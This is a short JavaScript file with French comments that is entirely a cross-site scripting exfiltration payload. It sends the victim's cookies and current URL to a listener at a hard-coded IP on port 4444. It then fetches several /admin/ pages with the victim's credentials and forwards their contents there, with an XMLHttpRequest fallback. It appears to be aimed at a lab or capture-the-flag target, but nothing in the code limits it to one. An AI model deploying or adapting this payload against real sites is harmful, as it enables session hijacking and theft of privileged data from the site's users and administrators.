const listener = "http://10.139.32.179:4444";

function send(data) {
    fetch(listener, {
        method: "POST",
        mode: "no-cors",
        body: data
    });
}

// Envoyer d'abord la page actuelle
send("Current page: " + location.href + "\nCookies: " + document.cookie);

// Récupérer toutes les pages avec fetch
const pages = [
    "/admin/",
    "/admin/review.php",
    "/admin/search.php"
];

pages.forEach(url => {
    fetch(url, { credentials: "include" })
        .then(r => r.text())
        .then(body => {
            // Envoyer l'URL et le contenu
            send("=== " + url + " ===\n" + body);
        })
        .catch(e => {
            send("ERROR on " + url + ": " + e.message);
        });
});

// Envoyer aussi via XMLHttpRequest (fallback)
setTimeout(() => {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "/admin/", true);
    xhr.withCredentials = true;
    xhr.onload = function() {
        send("XHR /admin/ : " + this.responseText);
    };
    xhr.send();
}, 1000);
